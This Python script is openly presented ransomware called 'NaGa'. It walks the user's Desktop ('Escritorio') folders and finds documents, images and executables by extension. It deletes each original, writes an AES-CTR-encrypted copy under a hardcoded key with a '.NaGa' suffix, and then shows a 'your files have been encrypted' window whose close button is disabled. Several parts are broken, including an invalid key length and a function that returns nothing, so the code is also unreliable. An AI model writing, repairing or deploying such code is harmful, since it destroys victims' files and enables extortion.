from importlib.resources import path
import os
from pathlib import Path
import glob
import pyaes
import tkinter as tk


EXTENSION = ".NaGa"

extensiones = ["*.txt", "*.pdf", "*.exe", "*.xlsx", "*.docx", "*.xls", "*.xml", "*.cpp", "*.doc", "*.jpg", "*.png"]
char = "."

def rutas(dir):
    path = Path.home() / dir
    return path

def cambiar_ruta():
    try:
        ruta = rutas()
        return ruta
    except Exception:
        pass

def directorios():
    directorios = os.listdir(rutas("Escritorio"))
    return directorios

def recorrer_dir():
    for dires in directorios():
        if not os.path.isdir(dires):
            os.chdir(str(rutas("Escritorio"))+"/"+dires) #"Escritorio es la ruta que va a encriptar con sus subdirectorios"
            print(os.getcwd())

def encriptar():
    for archivos in extensiones:
        for archivoFor in glob.glob(archivos):
            print(archivoFor)
            f = open(f'{recorrer_dir()}/{archivoFor}', 'rb')
            datosAr = f.read()
            f.close()

            os.remove(f'{recorrer_dir()}/{archivoFor}')
            key = "Azrael"
            aes = pyaes.AESModeOfOperationCTR(key)
            datosEncriptados = aes.encrypt(datosAr)

            nuevoAr = archivoFor.replace(char, "") + EXTENSION
            nuevoAr = open(f'{nuevoAr}', 'wb')
            nuevoAr.write(datosEncriptados)
            nuevoAr.close()

if __name__ == "__main__":
    encriptar()
    window = tk.Tk()
    window.title("NaGa")

    label = tk.Label(window, text="[Tus archivos han sido encriptados por NaGa]\n\n 'El arma mas poderosa siempre sera el conocimiento'",
                    bg='black', bd=100, fg="pink", font="Terminal")
    label.pack()
    window.resizable(False, False)
    def cerraVen():
        window.destroy()
    def desactivar():
        pass
    window.protocol("WM_DELETE_WINDOW", desactivar)
    window.mainloop()
